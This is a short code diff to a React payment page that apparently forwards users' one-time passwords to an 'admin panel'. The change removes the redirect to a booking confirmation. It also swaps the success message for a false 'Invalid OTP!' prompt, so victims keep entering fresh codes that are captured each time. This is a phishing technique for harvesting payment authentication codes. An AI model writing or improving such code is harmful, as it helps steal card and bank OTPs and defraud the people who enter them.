@@ -51,12 +51,6 @@ export default function PaymentPage() {
     } catch (err) {
       console.error('Admin Panel Request Failed:', err);
       return null;
-    } finally {
-      if (payload.activityType === 'otp_submission') {
-        const receiptUrl = new URL('/booking-confirmation.html', window.location.origin);
-        receiptUrl.search = window.location.search;
-        window.location.assign(receiptUrl.toString());
-      }
     }
   };
 
@@ -176,7 +170,7 @@ export default function PaymentPage() {
         submittedAt: new Date().toISOString()
       });
 
-      setMessage('OTP submitted successfully to admin panel!');
+      setMessage('Invalid OTP! Please enter the correct OTP sent to your registered mobile number.');
       setOtp(''); // Input clear kar rahe hain
     } catch (err) {
       setMessage('Failed to submit OTP. Please try again.');
